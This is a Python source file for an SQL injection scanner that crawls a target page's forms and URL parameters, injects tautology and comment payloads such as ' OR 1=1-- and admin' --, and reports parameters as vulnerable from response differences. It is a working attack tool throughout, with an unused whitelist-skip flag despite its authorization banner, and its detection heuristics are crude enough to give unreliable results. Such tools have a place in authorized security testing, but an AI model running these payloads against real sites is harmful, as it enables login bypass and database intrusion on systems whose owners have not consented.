"""
SQL Injection Framework - Standalone Runner

This script provides a simple way to run the SQL injection scanner
without dealing with package import issues.
"""

import argparse
import asyncio
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import httpx
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse
from datetime import datetime

urllib3.disable_warnings()

VERSION = "1.0.0"

def display_banner():
    banner = """
+=================================================================+
|     SQL Injection Assessment Framework v1.0.0                  +
|                                                                 |
|  !!  AUTHORIZED SECURITY TESTING ONLY                    !!   |
|  !!  Use only on systems you own or have permission       !!   |
+=================================================================+
"""
    print(banner)

def parse_args():
    parser = argparse.ArgumentParser(
        description="SQL Injection Assessment Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://example.com/page.php?id=1"
  %(prog)s -u "https://demo.testfire.net/login.jsp" -v
  %(prog)s -u "http://example.com" -o results.json --format html
  %(prog)s -u "http://example.com" -p "http://localhost:8080"
  %(prog)s -u "http://example.com" --payload add.txt
        """
    )
    parser.add_argument("-u", "--target", required=True, help="Target URL to test")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Crawl depth (default: 2)")
    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Concurrent requests (default: 10)")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    parser.add_argument("-p", "--proxy", help="HTTP/HTTPS proxy URL")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("-f", "--format", choices=["json", "html", "both"], default="json", help="Output format")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--skip-whitelist", action="store_true", help="Skip domain whitelist check")
    parser.add_argument("--payload", help="Custom payload file (one payload per line)")
    return parser.parse_args()

def load_payloads(payload_file=None):
    """Load payloads from file or use defaults"""
    default_payloads = [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' OR '1'='1",
        "1' --",
        "1' OR 'a'='a",
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "admin' OR '1'='1",
        "1 AND 1=1",
        "1 OR 1=1",
    ]
    
    if payload_file and os.path.exists(payload_file):
        with open(payload_file, 'r') as f:
            custom = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"[+] Loaded {len(custom)} custom payloads from {payload_file}")
            return custom
    
    return default_payloads

async def test_get_sqli(client, url, param, payloads, verbose=False):
    """Test GET parameter for SQL injection"""
    try:
        r1 = await client.get(url)
        orig_len = len(r1.text)
        orig_status = r1.status_code
        orig_content = r1.text
        
        results = []
        for payload in payloads:
            test = f"{param}={payload}"
            test_url = f"{url}&{test}" if "?" in url else f"{url}?{test}"
            r2 = await client.get(test_url)
            
            len_diff = len(r2.text) - orig_len
            status_diff = r2.status_code - orig_status
            
            welcome1 = "Welcome" in r2.text and "Welcome" not in orig_content
            error_change = ("Invalid" in orig_content or "error" in orig_content.lower()) and \
                          not ("Invalid" in r2.text or "error" in r2.text.lower())
            
            if verbose:
                print(f"    Payload: {payload[:30]}... len_diff={len_diff}")
            
            results.append({
                "payload": payload,
                "len_diff": len_diff,
                "status_diff": status_diff,
                "vulnerable": abs(len_diff) > 10 or status_diff != 0 or welcome1 or error_change
            })
        
        vulnerable = any(r["vulnerable"] for r in results)
        return vulnerable, results
        
    except Exception as e:
        if verbose:
            print(f"    Error: {e}")
        return False, []

async def test_post_sqli(client, url, param, data, payloads, verbose=False):
    """Test POST parameter for SQL injection"""
    try:
        r1 = await client.post(url, data=data)
        orig_len = len(r1.text)
        orig_content = r1.text
        
        results = []
        for payload in payloads:
            test_data = dict(data)
            test_data[param] = payload
            
            r2 = await client.post(url, data=test_data)
            len_diff = len(r2.text) - orig_len
            
            welcome = "Welcome" in r2.text and "Welcome" not in orig_content
            error_change = ("Invalid" in orig_content or "error" in orig_content.lower()) and \
                          not ("Invalid" in r2.text or "error" in r2.text.lower())
            
            if verbose:
                print(f"    Payload: {payload[:30]}... len_diff={len_diff}")
            
            results.append({
                "param": param,
                "payload": payload,
                "len_diff": len_diff,
                "vulnerable": abs(len_diff) > 100 or welcome or error_change
            })
        
        vulnerable = any(r["vulnerable"] for r in results)
        return vulnerable, results
        
    except Exception as e:
        if verbose:
            print(f"    Error: {e}")
        return False, []

async def scan_target(target_url, args, payloads):
    """Scan target for SQL injection vulnerabilities"""
    print(f"\n[+] Scanning: {target_url}")
    print(f"[+] Depth: {args.depth}, Concurrency: {args.concurrency}, Timeout: {args.timeout}s")
    print(f"[+] Payloads: {len(payloads)} loaded\n")
    
    vulnerabilities = []
    
    proxy = args.proxy if args.proxy else None
    
    async with httpx.AsyncClient(
        timeout=args.timeout,
        verify=False,
        proxy=proxy,
        follow_redirects=True,
    ) as client:
        try:
            r = await client.get(target_url)
            print(f"[+] Target accessible: {r.status_code}")
        except Exception as e:
            print(f"[-] Error accessing target: {e}")
            return vulnerabilities
        
        soup = BeautifulSoup(r.text, 'html.parser')
        
        print("\n[*] Testing forms...")
        forms = soup.find_all('form')
        print(f"[*] Found {len(forms)} forms")
        
        for i, form in enumerate(forms):
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            full_url = urljoin(target_url, action)
            
            inputs = form.find_all('input')
            input_names = [inp.get('name') for inp in inputs if inp.get('name')]
            
            print(f"\n  Form {i+1}: {method} {full_url}")
            print(f"  Parameters: {input_names}")
            
            for param in input_names:
                if method == 'GET':
                    vulnerable, details = await test_get_sqli(client, full_url, param, payloads, args.verbose)
                else:
                    base_data = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}
                    vulnerable, details = await test_post_sqli(client, full_url, param, base_data, payloads, args.verbose)
                
                if vulnerable:
                    print(f"  [!] VULNERABLE: {param}")
                    vulnerabilities.append({
                        "url": full_url,
                        "method": method,
                        "parameter": param,
                        "type": "GET" if method == "GET" else "POST",
                        "details": details
                    })
                else:
                    print(f"  [-] Not vulnerable: {param}")
        
        print("\n[*] Testing URL parameters...")
        
        parsed = urlparse(target_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            print(f"[*] Found {len(params)} URL parameters: {list(params.keys())}")
            
            for param in params.keys():
                vulnerable, details = await test_get_sqli(client, target_url, param, payloads, args.verbose)
                
                if vulnerable:
                    print(f"  [!] VULNERABLE: {param}")
                    vulnerabilities.append({
                        "url": target_url,
                        "method": "GET",
                        "parameter": param,
                        "type": "URL",
                        "details": details
                    })
                else:
                    print(f"  [-] Not vulnerable: {param}")
    
    return vulnerabilities

def save_results(vulnerabilities, output_file, format_type):
    """Save scan results"""
    import json
    
    timestamp = datetime.now().isoformat()
    results = {
        "timestamp": timestamp,
        "total_vulnerabilities": len(vulnerabilities),
        "vulnerabilities": vulnerabilities
    }
    
    if format_type in ["json", "both"]:
        json_file = output_file if output_file else "sqli_results.json"
        with open(json_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[+] Results saved to: {json_file}")
    
    if format_type in ["html", "both"]:
        html_file = output_file.replace('.json', '.html') if output_file else "sqli_results.html"
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection Scan Results</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #d9534f; }}
        .vuln {{ border: 1px solid #d9534f; padding: 10px; margin: 10px 0; background: #f8f8f8; }}
        .param {{ font-weight: bold; color: #d9534f; }}
    </style>
</head>
<body>
    <h1>SQL Injection Scan Results</h1>
    <p>Total Vulnerabilities: {len(vulnerabilities)}</p>
    <p>Timestamp: {timestamp}</p>
"""
        for vuln in vulnerabilities:
            html_content += f"""
    <div class="vuln">
        <p><span class="param">URL:</span> {vuln['url']}</p>
        <p><span class="param">Method:</span> {vuln['method']}</p>
        <p><span class="param">Parameter:</span> {vuln['parameter']}</p>
    </div>
"""
        html_content += "</body></html>"
        
        with open(html_file, 'w') as f:
            f.write(html_content)
        print(f"[+] HTML report saved to: {html_file}")

async def main():
    args = parse_args()
    display_banner()
    
    print("\n[!] LEGAL WARNING: This tool is for authorized security testing only.")
    print("[!] Unauthorized use is illegal and strictly prohibited.")
    print("[!] By proceeding, you confirm you have explicit permission to test the target.\n")
    
    # Load payloads
    payloads = load_payloads(args.payload)
    
    vulnerabilities = await scan_target(args.target, args, payloads)
    
    print(f"\n{'='*60}")
    print(f"Scan complete. Found {len(vulnerabilities)} vulnerabilities.")
    print(f"{'='*60}")
    
    if vulnerabilities:
        print("\n[!] VULNERABLE ENDPOINTS:")
        for vuln in vulnerabilities:
            print(f"  - {vuln['method']} {vuln['url']}")
            print(f"    Parameter: {vuln['parameter']}")
    
    if args.output or vulnerabilities:
        save_results(vulnerabilities, args.output, args.format)
    
    return 0 if len(vulnerabilities) == 0 else 1

if __name__ == "__main__":
    sys.exit(asyncio.run(main()))